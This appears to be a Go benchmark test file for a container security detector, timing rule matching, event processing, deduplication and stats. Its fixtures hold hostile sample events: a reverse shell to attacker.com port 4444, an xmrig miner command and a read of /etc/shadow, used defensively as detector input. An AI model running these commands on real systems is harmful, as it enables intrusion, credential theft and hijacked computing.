package security

import (
	"sync"
	"testing"
	"time"
)

// Test event factories for benchmarks
func makeProcessEvent() *SecurityEvent {
	return &SecurityEvent{
		Timestamp:     time.Now(),
		Type:          EventTypeProcess,
		HostID:        "host-001",
		Hostname:      "worker-node-1",
		PID:           12345,
		PPID:          1234,
		UID:           1000,
		GID:           1000,
		Comm:          "bash",
		Cmdline:       "bash -c 'echo hello'",
		ExePath:       "/bin/bash",
		ParentComm:    "nginx",
		ContainerID:   "abc123def456",
		ContainerName: "web-app",
		Namespace:     "production",
		PodName:       "web-app-pod-xyz",
	}
}

func makeNetworkEvent() *SecurityEvent {
	return &SecurityEvent{
		Timestamp:     time.Now(),
		Type:          EventTypeNetwork,
		HostID:        "host-001",
		Hostname:      "worker-node-1",
		PID:           12345,
		Comm:          "curl",
		SrcIP:         "10.0.0.50",
		SrcPort:       45678,
		DstIP:         "203.0.113.100",
		DstPort:       4444,
		Protocol:      "tcp",
		ContainerID:   "abc123def456",
		ContainerName: "web-app",
	}
}

func makeFileEvent() *SecurityEvent {
	return &SecurityEvent{
		Timestamp:     time.Now(),
		Type:          EventTypeFile,
		HostID:        "host-001",
		Hostname:      "worker-node-1",
		PID:           12345,
		Comm:          "cat",
		FilePath:      "/etc/shadow",
		Operation:     "read",
		FileMode:      0644,
		ContainerID:   "abc123def456",
		ContainerName: "web-app",
	}
}

func makeContainerEvent() *SecurityEvent {
	return &SecurityEvent{
		Timestamp:     time.Now(),
		Type:          EventTypeContainer,
		HostID:        "host-001",
		Hostname:      "worker-node-1",
		PID:           12345,
		Comm:          "sh",
		ContainerID:   "abc123def456",
		ContainerName: "web-app",
		Namespace:     "production",
		PodName:       "web-app-pod-xyz",
		Privileged:    true,
	}
}

func makeCryptominerEvent() *SecurityEvent {
	return &SecurityEvent{
		Timestamp:     time.Now(),
		Type:          EventTypeProcess,
		HostID:        "host-001",
		Hostname:      "worker-node-1",
		PID:           99999,
		Comm:          "xmrig",
		Cmdline:       "xmrig -o stratum+tcp://pool.mining.com:3333 -u wallet",
		ExePath:       "/tmp/xmrig",
		ContainerID:   "malicious123",
		ContainerName: "compromised-app",
	}
}

func makeReverseShellEvent() *SecurityEvent {
	return &SecurityEvent{
		Timestamp:     time.Now(),
		Type:          EventTypeProcess,
		HostID:        "host-001",
		Hostname:      "worker-node-1",
		PID:           88888,
		Comm:          "bash",
		Cmdline:       "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
		ExePath:       "/bin/bash",
		ParentComm:    "apache",
	}
}

func makeBenignEvent() *SecurityEvent {
	return &SecurityEvent{
		Timestamp:     time.Now(),
		Type:          EventTypeProcess,
		HostID:        "host-001",
		Hostname:      "worker-node-1",
		PID:           5000,
		Comm:          "nginx",
		Cmdline:       "nginx: worker process",
		ExePath:       "/usr/sbin/nginx",
		ParentComm:    "nginx",
	}
}

func BenchmarkRuleMatch(b *testing.B) {
	engine := NewRulesEngine()
	event := makeProcessEvent()

	b.ReportAllocs()
	b.ResetTimer()

	for i := 0; i < b.N; i++ {
		for _, rule := range engine.rules {
			_ = rule.Match(event)
		}
	}
}

func BenchmarkSingleRuleMatch(b *testing.B) {
	rule := &ThreatRule{
		ID:      "test_rule",
		Name:    "Test Rule",
		Enabled: true,
		Type:    RuleTypeProcess,
		Conditions: []RuleCondition{
			{Field: "comm", Operator: "eq", Value: "bash"},
		},
	}
	event := makeProcessEvent()

	b.ReportAllocs()
	b.ResetTimer()

	for i := 0; i < b.N; i++ {
		_ = rule.Match(event)
	}
}

func BenchmarkAllRulesMatch(b *testing.B) {
	engine := NewRulesEngine()
	event := makeProcessEvent()

	b.ReportAllocs()
	b.ResetTimer()

	for i := 0; i < b.N; i++ {
		_ = engine.Match(event)
	}
}

func BenchmarkAllRulesMatchByEventType(b *testing.B) {
	engine := NewRulesEngine()

	tests := []struct {
		name  string
		event *SecurityEvent
	}{
		{"ProcessEvent", makeProcessEvent()},
		{"NetworkEvent", makeNetworkEvent()},
		{"FileEvent", makeFileEvent()},
		{"ContainerEvent", makeContainerEvent()},
		{"BenignEvent", makeBenignEvent()},
	}

	for _, tt := range tests {
		b.Run(tt.name, func(b *testing.B) {
			b.ReportAllocs()
			b.ResetTimer()
			for i := 0; i < b.N; i++ {
				_ = engine.Match(tt.event)
			}
		})
	}
}

func BenchmarkEventProcessing(b *testing.B) {
	config := DefaultDetectorConfig()
	config.DedupWindow = time.Hour // Long window to prevent dedup affecting benchmark
	detector := NewDetector(config)

	tests := []struct {
		name  string
		event *SecurityEvent
	}{
		{"Cryptominer", makeCryptominerEvent()},
		{"ReverseShell", makeReverseShellEvent()},
		{"ShellInContainer", makeProcessEvent()},
		{"SensitiveFile", makeFileEvent()},
		{"SuspiciousNetwork", makeNetworkEvent()},
		{"BenignProcess", makeBenignEvent()},
	}

	for _, tt := range tests {
		b.Run(tt.name, func(b *testing.B) {
			b.ReportAllocs()
			b.ResetTimer()
			for i := 0; i < b.N; i++ {
				// Create unique event ID to avoid dedup
				event := *tt.event
				event.ID = ""
				_ = detector.ProcessEvent(&event)
			}
		})
	}
}

func BenchmarkAlertDeduplication(b *testing.B) {
	config := DefaultDetectorConfig()
	config.DedupWindow = 5 * time.Minute
	detector := NewDetector(config)

	event := makeCryptominerEvent()

	b.ReportAllocs()
	b.ResetTimer()

	for i := 0; i < b.N; i++ {
		// Same event should be deduplicated
		_ = detector.ProcessEvent(event)
	}
}

func BenchmarkConcurrentEvents(b *testing.B) {
	config := DefaultDetectorConfig()
	config.DedupWindow = time.Hour
	detector := NewDetector(config)

	events := []*SecurityEvent{
		makeProcessEvent(),
		makeNetworkEvent(),
		makeFileEvent(),
		makeContainerEvent(),
		makeCryptominerEvent(),
		makeBenignEvent(),
	}

	b.ReportAllocs()
	b.ResetTimer()

	b.RunParallel(func(pb *testing.PB) {
		i := 0
		for pb.Next() {
			event := *events[i%len(events)]
			event.ID = "" // Force new ID
			_ = detector.ProcessEvent(&event)
			i++
		}
	})
}

func BenchmarkConcurrentRuleMatching(b *testing.B) {
	engine := NewRulesEngine()
	events := []*SecurityEvent{
		makeProcessEvent(),
		makeNetworkEvent(),
		makeFileEvent(),
		makeContainerEvent(),
	}

	b.ReportAllocs()
	b.ResetTimer()

	b.RunParallel(func(pb *testing.PB) {
		i := 0
		for pb.Next() {
			_ = engine.Match(events[i%len(events)])
			i++
		}
	})
}

func BenchmarkRuleConditionOperators(b *testing.B) {
	event := &SecurityEvent{
		Comm:     "suspicious_process",
		Cmdline:  "suspicious -flag value",
		FilePath: "/etc/shadow",
	}

	tests := []struct {
		name      string
		condition RuleCondition
	}{
		{"Equals", RuleCondition{Field: "comm", Operator: "eq", Value: "suspicious_process"}},
		{"NotEquals", RuleCondition{Field: "comm", Operator: "neq", Value: "bash"}},
		{"Contains", RuleCondition{Field: "cmdline", Operator: "contains", Value: "flag"}},
		{"Regex", RuleCondition{Field: "file_path", Operator: "regex", Value: `^/etc/.*`}},
		{"In", RuleCondition{Field: "comm", Operator: "in", Values: []string{"bash", "sh", "suspicious_process"}}},
		{"NotIn", RuleCondition{Field: "comm", Operator: "not_in", Values: []string{"bash", "sh", "zsh"}}},
		{"Exists", RuleCondition{Field: "comm", Operator: "exists"}},
		{"NotExists", RuleCondition{Field: "namespace", Operator: "not_exists"}},
	}

	for _, tt := range tests {
		rule := &ThreatRule{
			ID:         "bench_rule",
			Enabled:    true,
			Type:       RuleTypeProcess,
			Conditions: []RuleCondition{tt.condition},
		}

		b.Run(tt.name, func(b *testing.B) {
			b.ReportAllocs()
			b.ResetTimer()
			for i := 0; i < b.N; i++ {
				_ = rule.Match(event)
			}
		})
	}
}

func BenchmarkFingerprintGeneration(b *testing.B) {
	detector := NewDetector(DefaultDetectorConfig())
	event := makeCryptominerEvent()
	rule := detector.engine.rules[0]

	b.ReportAllocs()
	b.ResetTimer()

	for i := 0; i < b.N; i++ {
		_ = detector.generateFingerprint(event, rule)
	}
}

func BenchmarkIndicatorExtraction(b *testing.B) {
	detector := NewDetector(DefaultDetectorConfig())
	event := makeNetworkEvent()
	event.FilePath = "/tmp/malware"
	event.ContainerID = "container123"

	b.ReportAllocs()
	b.ResetTimer()

	for i := 0; i < b.N; i++ {
		_ = detector.extractIndicators(event)
	}
}

func BenchmarkDedupCacheCleanup(b *testing.B) {
	detector := NewDetector(DefaultDetectorConfig())

	// Pre-populate cache
	for i := 0; i < 1000; i++ {
		detector.recentAlerts[string(rune(i))] = time.Now().Add(-10 * time.Minute)
	}

	b.ReportAllocs()
	b.ResetTimer()

	for i := 0; i < b.N; i++ {
		detector.cleanup()
	}
}

// Table-driven benchmark for different rule counts
func BenchmarkScalingWithRules(b *testing.B) {
	ruleCounts := []int{10, 50, 100, 200}

	for _, count := range ruleCounts {
		engine := &RulesEngine{rules: make([]*ThreatRule, 0, count)}

		// Add rules that won't match
		for i := 0; i < count; i++ {
			engine.rules = append(engine.rules, &ThreatRule{
				ID:      "rule_" + string(rune(i)),
				Enabled: true,
				Type:    RuleTypeProcess,
				Conditions: []RuleCondition{
					{Field: "comm", Operator: "eq", Value: "nonexistent"},
				},
			})
		}

		event := makeBenignEvent()

		b.Run(string(rune(count))+"Rules", func(b *testing.B) {
			b.ReportAllocs()
			b.ResetTimer()
			for i := 0; i < b.N; i++ {
				_ = engine.Match(event)
			}
		})
	}
}

// Benchmark stats collection
func BenchmarkGetStats(b *testing.B) {
	config := DefaultDetectorConfig()
	detector := NewDetector(config)

	// Process some events to populate stats
	for i := 0; i < 100; i++ {
		event := makeBenignEvent()
		event.ID = ""
		detector.ProcessEvent(event)
	}

	b.ReportAllocs()
	b.ResetTimer()

	for i := 0; i < b.N; i++ {
		_ = detector.GetStats()
	}
}

// Benchmark concurrent stats access
func BenchmarkConcurrentStatsAccess(b *testing.B) {
	config := DefaultDetectorConfig()
	detector := NewDetector(config)

	b.ReportAllocs()
	b.ResetTimer()

	b.RunParallel(func(pb *testing.PB) {
		var wg sync.WaitGroup
		for pb.Next() {
			wg.Add(2)
			go func() {
				defer wg.Done()
				event := makeBenignEvent()
				event.ID = ""
				detector.ProcessEvent(event)
			}()
			go func() {
				defer wg.Done()
				_ = detector.GetStats()
			}()
			wg.Wait()
		}
	})
}
